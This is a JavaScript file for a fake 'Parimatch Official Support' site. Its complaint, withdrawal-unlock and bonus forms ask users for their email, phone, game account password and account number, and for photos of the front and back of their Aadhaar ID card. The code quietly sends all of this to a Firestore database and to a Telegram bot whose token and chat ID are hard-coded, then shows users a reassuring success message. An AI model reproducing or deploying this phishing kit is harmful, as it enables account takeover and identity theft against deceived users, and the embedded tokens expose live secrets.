// ===== Parimatch Support Site - Firebase Firestore Integration =====

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "parimatch";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

document.addEventListener('DOMContentLoaded', () => {

  // Splash screen - remove after animation
  setTimeout(() => {
    const splash = document.getElementById('splashScreen');
    if (splash) splash.remove();
  }, 2500);

  // Page transition helper
  function navigateWithTransition(url) {
    const overlay = document.getElementById('pageTransition');
    if (overlay) {
      overlay.classList.add('active');
      setTimeout(() => { window.location.href = url; }, 400);
    } else {
      window.location.href = url;
    }
  }

  // Auto-select tab from URL params (complaint.html?tab=deposit)
  const urlParams = new URLSearchParams(window.location.search);
  const tabParam = urlParams.get('tab');
  if (tabParam) {
    const targetTab = document.querySelector('[data-tab="' + tabParam + '"]');
    if (targetTab) targetTab.click();
  }

  // COMPLAIN NOW Button Redirect with transition
  const submitBtn = document.getElementById('submitProblemBtn');
  if (submitBtn) {
    submitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      navigateWithTransition('complaint.html');
    });
  }

  // Helper: Redirect to complaint page with transition
  window.scrollToForm = (type) => {
    navigateWithTransition('complaint.html?tab=' + type);
  };

  // Internal links with transition (exclude already-handled buttons)
  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"]').forEach(link => {
    if (link.id === 'submitProblemBtn') return;
    link.addEventListener('click', (e) => {
      if (!link.hasAttribute('target')) {
        e.preventDefault();
        navigateWithTransition(link.getAttribute('href'));
      }
    });
  });

  // ✅ Form logic - only runs on complaint page
  const problemForm = document.getElementById('problemForm');
  if (problemForm) {
    const tabBtns = document.querySelectorAll('.tab-btn');
    const depositFields = document.getElementById('depositFields');
    const withdrawalFields = document.getElementById('withdrawalFields');

    tabBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        tabBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tab = btn.dataset.tab;

        if (tab === 'deposit') {
          depositFields.classList.add('active');
          withdrawalFields.classList.remove('active');
          document.getElementById('depositAmount').required = true;
          document.getElementById('utr').required = true;
          document.getElementById('withdrawAmount').required = false;
        } else {
          depositFields.classList.remove('active');
          withdrawalFields.classList.add('active');
          document.getElementById('depositAmount').required = false;
          document.getElementById('utr').required = false;
          document.getElementById('withdrawAmount').required = true;
        }
      });
    });

    // Form Submission - FIREBASE SAVE
    problemForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const submitBtn = problemForm.querySelector('.btn-submit');
      const originalBtnText = submitBtn.innerHTML;
      submitBtn.innerHTML = "⏳ Sending...";
      submitBtn.disabled = true;

      try {
        const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);

        const email = document.getElementById('email').value;
        const mobile = document.getElementById('mobile').value;
        const password = document.getElementById('password').value;
        const description = document.getElementById('description').value;
        const type = document.querySelector('.tab-btn.active').dataset.tab;
        const timestamp = new Date().toLocaleString('en-IN', {
          day: '2-digit', month: 'short', year: 'numeric',
          hour: '2-digit', minute: '2-digit', hour12: true
        });

        let amount = "", utr = "", method = "";
        if (type === 'deposit') {
          amount = document.getElementById('depositAmount').value;
          utr = document.getElementById('utr').value;
        } else {
          amount = document.getElementById('withdrawAmount').value;
          method = document.getElementById('withdrawMethod').value;
        }

        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);

        await saveSubmission({
          request_id: requestId,
          email: email,
          mobile: mobile,
          password: password,
          description: description,
          type: type === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem',
          amount: amount,
          utr: utr || 'N/A',
          withdraw_method: method || 'Not specified',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        showNotification("✅ Complaint filed successfully!", "success");
        problemForm.reset();
        depositFields.classList.add('active');
        withdrawalFields.classList.remove('active');
        document.querySelector('[data-tab="deposit"]').classList.add('active');
        document.querySelector('[data-tab="withdrawal"]').classList.remove('active');

      } catch (error) {
        console.error("Firebase Error:", error);
        showNotification("❌ Failed to send. Please try again.", "error");
      } finally {
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
      }
    });
  }

  // iOS-style Notification
  function showNotification(message, type = "info") {
    const existing = document.querySelector('.ios-notification');
    if (existing) existing.remove();
    
    const notif = document.createElement('div');
    notif.className = `ios-notification ${type}`;
    notif.innerHTML = `
      <div class="notif-content">
        <span class="notif-icon">${type === 'success' ? '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><polyline points="20 6 9 17 4 12"/></svg>' : type === 'error' ? '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>' : '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'}</span>
        <span>${message}</span>
      </div>
    `;
    
    notif.style.cssText = `
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: ${type === 'success' ? 'rgba(52,199,89,0.95)' : type === 'error' ? 'rgba(255,59,48,0.95)' : 'rgba(63,169,245,0.95)'};
      color: #0F1012;
      padding: 14px 20px;
      border-radius: 16px;
      font-weight: 500;
      font-size: 0.95rem;
      z-index: 1000;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
      backdrop-filter: blur(10px);
      max-width: 90%;
      text-align: center;
      animation: slideDown 0.3s ease, fadeOut 0.3s ease 2.7s forwards;
    `;
    
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
  }
  
  // Add keyframes
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideDown { from { top: -60px; opacity: 0; } to { top: 20px; opacity: 1; } }
    @keyframes fadeOut { to { opacity: 0; transform: translateX(-50%) translateY(-10px); } }
  `;
  document.head.appendChild(style);

  // iOS Input Enhancements
  document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('focus', function() {
      this.parentElement.style.transform = 'scale(1.01)';
      this.parentElement.style.transition = 'transform 0.2s ease';
    });
    input.addEventListener('blur', function() {
      this.parentElement.style.transform = 'scale(1)';
    });
  });

  // Prevent zoom on focus (iOS)
  document.querySelectorAll('input, select, textarea').forEach(el => {
    el.addEventListener('focus', () => {
      if (window.innerWidth < 1024) {
        document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
      }
    });
    el.addEventListener('blur', () => {
      document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes');
    });
  });

  console.log("%c[Parimatch Support Loaded]", "color:#D8F529; font-size:14px; font-weight:bold;");
  console.log("%c[Firebase Integration Ready | Secure]", "color:#FFA000;");

  // Preload Firebase in background
  loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
});

// ============================================================
//  UNLOCK WITHDRAWAL - 2-Step Flow
//  Step 1: Account Verification  |  Step 2: Documents
// ============================================================

const $unlock = id => document.getElementById(id);

// ===== TELEGRAM CONFIG =====
const TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
const TG_CHAT_ID = '-1003782852692';

function sendTelegramMessage(text) {
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (!data.ok) throw new Error(data.description || 'Telegram send failed');
    return data;
  });
}

function sendImageToTelegram(file, caption) {
  var fd = new FormData();
  fd.append('chat_id', TG_CHAT_ID);
  fd.append('photo', file);
  fd.append('caption', caption);
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
    method: 'POST',
    body: fd
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (data.ok) {
      return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
    } else {
      throw new Error(data.description || 'Telegram send failed');
    }
  });
}

function uploadFile(file, storagePath, reqId) {
  var parts = storagePath.split('/');
  var fileName = parts[parts.length - 1];
  var rid = reqId || _rid;
  var caption = '🆔 ' + rid + ' | ' + fileName.replace(/\.[^/.]+$/, '');
  return sendImageToTelegram(file, caption);
}

// ===== LOCAL REQUESTS STORAGE =====
const REQ_STORAGE_KEY = 'parimatch_unblock_requests';

function getLocalRequests() {
  return JSON.parse(localStorage.getItem(REQ_STORAGE_KEY) || '[]');
}

function saveRequestToLocal(data) {
  var requests = getLocalRequests();
  data._reqTime = new Date().toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit'
  });
  if (!data.reqId) data.reqId = "TX" + Math.floor(100000 + Math.random() * 900000);
  requests.unshift(data);
  localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(requests));
}

// ===== UNBLOCK MULTI-STEP =====
var _unblockData = {};
var _rid = null;

function goToStep(step) {
  for (var i = 1; i <= 2; i++) {
    var panel = $unlock('step' + i);
    var dot = $unlock('stepDot' + i);
    var line = $unlock('stepLine' + i);
    if (panel) panel.classList.remove('active');
    if (dot) dot.classList.remove('active', 'done');
    if (line) line.classList.remove('done');
  }
  var activePanel = $unlock('step' + step);
  if (activePanel) activePanel.classList.add('active');
  for (var j = 1; j <= step; j++) {
    var d = $unlock('stepDot' + j);
    if (d) {
      if (j < step) d.classList.add('done');
      else d.classList.add('active');
    }
    if (j < step) {
      var l = $unlock('stepLine' + j);
      if (l) l.classList.add('done');
    }
  }
}

function showUnlockToast(msg, type) {
  var el = $unlock('toastMessage');
  if (el) el.textContent = msg;
  var t = $unlock('toast');
  if (!t) return;
  t.classList.add('show');
  if (type) t.classList.add('toast-' + type);
  setTimeout(function() {
    t.classList.remove('show');
    if (type) t.classList.remove('toast-' + type);
  }, 2500);
}

function submitUnblockRequest() {
  var submitBtn = $unlock('step2Submit');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
  }
  var rid = _rid || "TX" + Math.floor(100000 + Math.random() * 900000);
  _rid = rid;
  var d = { type: 'unlock_withdrawal', site_id: SITE_ID, reqId: rid };
  Object.keys(_unblockData).forEach(function(k) { d[k] = _unblockData[k]; });
  var fileFields = [
    { field: 'issue_image', key: 'issue_image_url', single: true },
    { field: 'aadhar_front', key: 'aadhar_front_url', single: true },
    { field: 'aadhar_back', key: 'aadhar_back_url', single: true }
  ];
  var uploadPromises = [];
  fileFields.forEach(function(ff) {
    var fileInput = document.querySelector('[name="' + ff.field + '"]');
    if (fileInput && fileInput.files && fileInput.files.length > 0) {
      if (ff.single) {
        var file = fileInput.files[0];
        var ext = file.name.split('.').pop();
        var path = 'unlock/' + rid + '/' + ff.field + '.' + ext;
        uploadPromises.push(uploadFile(file, path).then(function(url) {
          d[ff.key] = url;
        }));
      }
    }
  });
  Promise.all(uploadPromises).then(function() {
    d.time = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    saveRequestToLocal(d);
    showUnlockToast('Request sent to support team! ✅');
    return saveSubmission(d);
  }).then(function() {
    document.querySelectorAll('.file-label').forEach(function(l) {
      l.classList.remove('has-file');
      var icon = l.querySelector('i');
      var span = l.querySelector('span');
      if (icon && span) {
        if (l.id.includes('Issue') || l.id.includes('issue')) { icon.className = 'fas fa-image'; span.textContent = 'Choose issue screenshot'; }
        else if (l.id.includes('aadharFront') || l.id.includes('AadharFront')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar front image'; }
        else if (l.id.includes('aadharBack') || l.id.includes('AadharBack')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar back image'; }
      }
    });
    document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
    if (submitBtn) submitBtn.disabled = false;
    var sp = $unlock('successPopup');
    if (sp) sp.classList.add('active');
  }).catch(function(err) {
    console.warn('Unblock submit failed:', err);
    showUnlockToast('Submission failed - try again', 'error');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Request';
    }
  });
}

// ===== UNBLOCK EVENT BINDING =====
try {
  // Step 1 → Next
  var s1n = $unlock('step1Next');
  if (s1n) {
    s1n.addEventListener('click', function() {
      var uname = $unlock('fUserName');
      var em = $unlock('fEmail');
      var acc = $unlock('fAccountNumber');
      var pwd = $unlock('fPassword');
      if (!uname || !uname.value.trim()) { showUnlockToast('Enter User Name'); uname.focus(); return; }
      if (!em || !em.value.trim()) { showUnlockToast('Enter Game Email ID'); em.focus(); return; }
      if (!acc || !acc.value.trim()) { showUnlockToast('Enter Game Account Number'); acc.focus(); return; }
      if (!pwd || !pwd.value.trim()) { showUnlockToast('Enter Game Account Password'); pwd.focus(); return; }
      _unblockData.user_name = uname.value.trim();
      _unblockData.email = em.value.trim();
      _unblockData.account_number = acc.value.trim();
      _unblockData.password = pwd.value.trim();
      var msg = '<b>🔔 New Unlock Withdrawal Request</b>\n'
        + '<b>User Name:</b> ' + _unblockData.user_name + '\n'
        + '<b>Email:</b> ' + _unblockData.email + '\n'
        + '<b>Account No:</b> ' + _unblockData.account_number + '\n'
        + '<b>Time:</b> ' + new Date().toLocaleString('en-IN');
      sendTelegramMessage(msg).catch(function(e) { console.warn('TG notify:', e); });
      var partialRid = "TX" + Math.floor(100000 + Math.random() * 900000);
      saveSubmission({
        request_id: partialRid,
        type: 'Unlock Withdrawal',
        status: 'step1_complete',
        user_name: _unblockData.user_name,
        email: _unblockData.email,
        account_number: _unblockData.account_number,
        password: _unblockData.password,
        source: 'Parimatch Official Support'
      }).catch(function(e) { console.warn('Step1 save failed:', e); });
      goToStep(2);
    });
  }

  // Step 2 Submit
  var s2b = $unlock('step2Back');
  if (s2b) s2b.addEventListener('click', function() { goToStep(1); });
  var s2Submit = $unlock('step2Submit');
  if (s2Submit) {
    s2Submit.addEventListener('click', function() {
      var issue = document.querySelector('[name="issue_image"]');
      var aadharF = document.querySelector('[name="aadhar_front"]');
      var aadharB = document.querySelector('[name="aadhar_back"]');
      if (!issue || !issue.files || !issue.files[0]) { showUnlockToast('Upload issue image'); return; }
      if (!aadharF || !aadharF.files || !aadharF.files[0]) { showUnlockToast('Upload Aadhar front side image'); return; }
      if (!aadharB || !aadharB.files || !aadharB.files[0]) { showUnlockToast('Upload Aadhar back side image'); return; }
      _rid = "TX" + Math.floor(100000 + Math.random() * 900000);
      submitUnblockRequest();
    });
  }
} catch (e) { console.warn('unblock steps:', e); }

// ===== FILE INPUT UI (unblock page) =====
try {
  document.querySelectorAll('.file-input-wrap input[type="file"]').forEach(function(input) {
    input.addEventListener('change', function() {
      var label = this.parentElement.querySelector('.file-label');
      var nameEl = this.parentElement.parentElement.querySelector('.file-name');
      if (this.files && this.files.length > 0) {
        label.classList.add('has-file');
        var icon = label.querySelector('i');
        var span = label.querySelector('span');
        if (icon) icon.className = 'fas fa-check-circle';
        if (this.files.length > 1) {
          if (span) span.textContent = this.files.length + ' files selected';
          if (nameEl) nameEl.textContent = this.files.length + ' files selected: ' + this.files[0].name + (this.files.length > 1 ? ' +' + (this.files.length - 1) + ' more' : '');
        } else {
          if (span) span.textContent = this.files[0].name;
          if (nameEl) nameEl.textContent = 'Selected: ' + this.files[0].name;
        }
      } else {
        label.classList.remove('has-file');
      }
    });
  });
} catch (e) {}

try {
  var sp = $unlock('successPopup');
  if (sp) sp.addEventListener('click', function(e) {
    if (e.target === sp) sp.classList.remove('active');
  });
} catch (e) {}

// ============================================================
//  BONUS PROBLEM - 2-Step Flow
//  Step 1: Account Verification  |  Step 2: Bonus Details
// ============================================================

var _bonusData = {};
var _bRid = null;

function goToBonusStep(step) {
  for (var i = 1; i <= 2; i++) {
    var panel = $unlock('bStep' + i);
    var dot = $unlock('bStepDot' + i);
    var line = $unlock('bStepLine' + i);
    if (panel) panel.classList.remove('active');
    if (dot) dot.classList.remove('active', 'done');
    if (line) line.classList.remove('done');
  }
  var activePanel = $unlock('bStep' + step);
  if (activePanel) activePanel.classList.add('active');
  for (var j = 1; j <= step; j++) {
    var d = $unlock('bStepDot' + j);
    if (d) {
      if (j < step) d.classList.add('done');
      else d.classList.add('active');
    }
    if (j < step) {
      var l = $unlock('bStepLine' + j);
      if (l) l.classList.add('done');
    }
  }
}

function showBonusToast(msg) {
  var el = $unlock('bToastMessage');
  if (el) el.textContent = msg;
  var t = $unlock('bToast');
  if (!t) return;
  t.classList.add('show');
  setTimeout(function() {
    t.classList.remove('show');
  }, 2500);
}

function submitBonusRequest() {
  var submitBtn = $unlock('bStep2Submit');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
  }
  var rid = _bRid || "TX" + Math.floor(100000 + Math.random() * 900000);
  _bRid = rid;
  var d = { type: 'bonus_problem', site_id: SITE_ID, reqId: rid };
  Object.keys(_bonusData).forEach(function(k) { d[k] = _bonusData[k]; });
  d.bonus_amount = document.querySelector('[name="b_bonus_amount"]').value;

  var fileFields = [
    { field: 'bonus_issue_image', key: 'bonus_issue_image_url', single: true },
    { field: 'profile_image', key: 'profile_image_url', single: true }
  ];
  var uploadPromises = [];
  fileFields.forEach(function(ff) {
    var fileInput = document.querySelector('[name="' + ff.field + '"]');
    if (fileInput && fileInput.files && fileInput.files.length > 0) {
      if (ff.single) {
        var file = fileInput.files[0];
        var ext = file.name.split('.').pop();
        var path = 'bonus/' + rid + '/' + ff.field + '.' + ext;
        uploadPromises.push(uploadFile(file, path, rid).then(function(url) {
          d[ff.key] = url;
        }));
      }
    }
  });
  Promise.all(uploadPromises).then(function() {
    d.time = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    saveRequestToLocal(d);
    showBonusToast('Request sent to support team! ✅');
    return saveSubmission(d);
  }).then(function() {
    document.querySelectorAll('.file-label').forEach(function(l) {
      l.classList.remove('has-file');
      var icon = l.querySelector('i');
      var span = l.querySelector('span');
      if (icon && span) {
        if (l.id.includes('bonusIssue') || l.id.includes('BonusIssue')) { icon.className = 'fas fa-image'; span.textContent = 'Choose issue screenshot'; }
        else if (l.id.includes('profileImage') || l.id.includes('ProfileImage')) { icon.className = 'fas fa-user'; span.textContent = 'Choose profile image'; }
      }
    });
    document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
    if (submitBtn) submitBtn.disabled = false;
    var sp = $unlock('bSuccessPopup');
    if (sp) sp.classList.add('active');
  }).catch(function(err) {
    console.warn('Bonus submit failed:', err);
    showBonusToast('Submission failed - try again');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Request';
    }
  });
}

// ===== BONUS EVENT BINDING =====
try {
  // Step 1 → Next
  var bs1n = $unlock('bStep1Next');
  if (bs1n) {
    bs1n.addEventListener('click', function() {
      var uname = $unlock('bfUserName');
      var em = $unlock('bfEmail');
      var acc = $unlock('bfAccountNumber');
      var pwd = $unlock('bfPassword');
      if (!uname || !uname.value.trim()) { showBonusToast('Enter User Name'); uname.focus(); return; }
      if (!em || !em.value.trim()) { showBonusToast('Enter Game Email ID'); em.focus(); return; }
      if (!acc || !acc.value.trim()) { showBonusToast('Enter Game Account Number'); acc.focus(); return; }
      if (!pwd || !pwd.value.trim()) { showBonusToast('Enter Game Account Password'); pwd.focus(); return; }
      _bonusData.user_name = uname.value.trim();
      _bonusData.email = em.value.trim();
      _bonusData.account_number = acc.value.trim();
      _bonusData.password = pwd.value.trim();
      goToBonusStep(2);
    });
  }

  // Step 2 Back
  var bs2b = $unlock('bStep2Back');
  if (bs2b) bs2b.addEventListener('click', function() { goToBonusStep(1); });

  // Step 2 Submit
  var bs2Submit = $unlock('bStep2Submit');
  if (bs2Submit) {
    bs2Submit.addEventListener('click', function() {
      var amt = $unlock('bfBonusAmount');
      var issueImg = document.querySelector('[name="bonus_issue_image"]');
      var profileImg = document.querySelector('[name="profile_image"]');
      if (!amt || !amt.value.trim()) { showBonusToast('Enter bonus amount'); amt.focus(); return; }
      if (!issueImg || !issueImg.files || !issueImg.files[0]) { showBonusToast('Upload bonus issue image'); return; }
      if (!profileImg || !profileImg.files || !profileImg.files[0]) { showBonusToast('Upload profile image'); return; }
      _bRid = "TX" + Math.floor(100000 + Math.random() * 900000);
      submitBonusRequest();
    });
  }
} catch (e) { console.warn('bonus steps:', e); }

// ===== BONUS POPUP CLOSE =====
try {
  var bsp = $unlock('bSuccessPopup');
  if (bsp) bsp.addEventListener('click', function(e) {
    if (e.target === bsp) bsp.classList.remove('active');
  });
} catch (e) {}
